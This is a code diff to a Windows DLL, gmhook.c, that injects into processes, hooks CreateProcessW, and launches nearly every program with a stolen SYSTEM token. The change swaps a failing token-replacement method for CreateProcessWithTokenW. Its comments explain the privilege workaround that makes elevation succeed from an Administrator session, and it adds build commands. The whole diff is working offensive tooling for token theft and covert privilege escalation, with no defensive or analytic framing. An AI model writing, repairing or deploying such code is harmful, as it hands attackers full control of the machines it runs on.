@@ -6,13 +6,15 @@
  * 2. Explicit injection into any process via InjectIntoProcess export
  *
  * Hooks CreateProcessW to intercept EVERY process launch before it starts executing.
- * The intercepted process is created suspended, its primary token is replaced with a
- * stolen SYSTEM token via NtSetInformationProcess, and then resumed.
+ * The intercepted process is created directly with a stolen SYSTEM primary token via
+ * CreateProcessWithTokenW (needs only SeImpersonatePrivilege, which an interactive
+ * Administrator token holds), so the child is BORN as SYSTEM.
  *
  * Only the absolute core OS processes are protected from elevation.
  * All other processes (explorer, cmd, powershell, all user apps) are elevated.
  *
  * Build: cl /LD /O2 gmhook.c /link /EXPORT:InstallHook /EXPORT:UninstallHook /EXPORT:GetMsgProc /EXPORT:InjectIntoProcess user32.lib ntdll.lib advapi32.lib kernel32.lib
+ *   MinGW: gcc -O2 -Wall -shared -o gmhook.dll gmhook.c -ladvapi32 -lkernel32 -lntdll -luser32
  */
 #include <windows.h>
 #include <stdio.h>
@@ -61,7 +63,23 @@ typedef BOOL (WINAPI *CreateProcessW_t)(
     LPSTARTUPINFOW lpStartupInfo,
     LPPROCESS_INFORMATION lpProcessInformation);
 
+/* CreateProcessWithTokenW only needs SeImpersonatePrivilege (which an interactive
+   Administrator token holds), unlike NtSetInformationProcess(ProcessAccessToken)
+   which needs SeAssignPrimaryTokenPrivilege (Administrator does NOT hold it).
+   This makes the child BORN as SYSTEM instead of swapping its token afterwards. */
+typedef BOOL (WINAPI *CreateProcessWithTokenW_t)(
+    HANDLE hToken,
+    DWORD dwLogonFlags,
+    LPCWSTR lpApplicationName,
+    LPWSTR lpCommandLine,
+    DWORD dwCreationFlags,
+    LPVOID lpEnvironment,
+    LPCWSTR lpCurrentDirectory,
+    LPSTARTUPINFOW lpStartupInfo,
+    LPPROCESS_INFORMATION lpProcessInformation);
+
 static NtSetInformationProcess_t pNtSetInfo = NULL;
+static CreateProcessWithTokenW_t pCreateWithToken = NULL;
 static CreateProcessW_t pOrigCreateProcessW = NULL;
 static BOOL hookInstalled = FALSE;
 static DWORD gSystemPid = 0;
@@ -210,7 +228,6 @@ static BOOL WINAPI HookCreateProcessW(
     if (!gSystemToken) {
         EnablePrivilege(L"SeDebugPrivilege");
         EnablePrivilege(L"SeImpersonatePrivilege");
-        EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
         if (!PrepareSystemToken()) {
             return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
                 lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
@@ -218,31 +235,24 @@ static BOOL WINAPI HookCreateProcessW(
         }
     }
 
-    /* Create suspended */
-    DWORD flags = dwCreationFlags | CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
-    BOOL ret = pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
-        lpThreadAttributes, bInheritHandles, flags, lpEnvironment,
-        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
-    if (!ret) return FALSE;
-
-    /* Replace token on the newly created process */
-    if (pNtSetInfo) {
-        struct _PROCESS_ACCESS_TOKEN {
-            HANDLE Token;
-            HANDLE Thread;
-        } pat = { gSystemToken, NULL };
-        NTSTATUS status = pNtSetInfo(lpProcessInformation->hProcess, ProcessAccessToken, &pat, sizeof(pat));
-        if (status != 0) {
-            /* Token replacement failed — let the process run with its original token
-               rather than killing it, which prevents apps from flashing and closing. */
-            ResumeThread(lpProcessInformation->hThread);
-            return TRUE;
-        }
+    /* Create the child process directly with the stolen SYSTEM primary token.
+       CreateProcessWithTokenW only requires SeImpersonatePrivilege (held by the
+       Administrator token), so this works from an interactive Admin session where
+       the old NtSetInformationProcess token-swap (SeAssignPrimaryTokenPrivilege)
+       could never succeed. The child is BORN as SYSTEM. */
+    if (pCreateWithToken) {
+        BOOL ret = pCreateWithToken(gSystemToken, 0, lpApplicationName, lpCommandLine,
+            dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo,
+            lpProcessInformation);
+        if (ret) return TRUE;
+        /* CreateProcessWithTokenW failed (rare: bad flags/inheritance). Fall back to
+           the original CreateProcessW so the app still launches unelevated instead
+           of vanishing — no flashing, no silent close. */
     }
 
-    /* Resume the process now running as SYSTEM */
-    ResumeThread(lpProcessInformation->hThread);
-    return TRUE;
+    return pOrigCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes,
+        lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
+        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
 }
 
 /* IAT hook: much safer on x64 because we never touch instruction bytes. */
@@ -417,7 +427,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         gHModule = hModule;
         DisableThreadLibraryCalls(hModule);
         pNtSetInfo = (NtSetInformationProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtSetInformationProcess");
-        if (pNtSetInfo) {
+        pCreateWithToken = (CreateProcessWithTokenW_t)GetProcAddress(GetModuleHandleW(L"advapi32.dll"), "CreateProcessWithTokenW");
+        if (pCreateWithToken) {
             /* Only install hook if this process is not critical */
             wchar_t modName[MAX_PATH];
             GetModuleFileNameW(NULL, modName, MAX_PATH);
